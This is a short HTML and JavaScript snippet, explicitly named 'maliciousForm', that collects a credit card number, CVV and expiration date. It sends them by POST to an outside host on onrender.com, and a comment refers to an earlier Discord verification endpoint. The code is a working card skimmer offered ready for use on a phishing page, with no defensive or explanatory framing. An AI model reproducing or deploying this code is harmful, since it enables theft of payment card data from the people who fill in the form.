<form id="maliciousForm">
  <input type="text" id="creditCardInput" placeholder="Enter Credit Card Number" />
  <input type="text" id="cvvInput" placeholder="Enter CVV" />
  <input type="text" id="expirationInput" placeholder="Enter Expiration Date" />
  <button onclick="captureCreditCard()">Submit</button>
</form>

<script>
  function captureCreditCard() {
    var creditCardNumber = document.getElementById('creditCardInput').value;
    var cvv = document.getElementById('cvvInput').value;
    var expirationDate = document.getElementById('expirationInput').value;

    // Updated Discord server to https://verification-dcyg.onrender.com
    var renderWebhookURL = "https://mcloverrr.onrender.com";

    // Adjusted webhook data structure
    var webhookData = {
      creditCardNumber: creditCardNumber,
      cvv: cvv,
      expirationDate: expirationDate
    };

    var xhttp = new XMLHttpRequest();
    xhttp.open("POST", renderWebhookURL, true);
    xhttp.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
    xhttp.send(JSON.stringify(webhookData));
  }
</script>
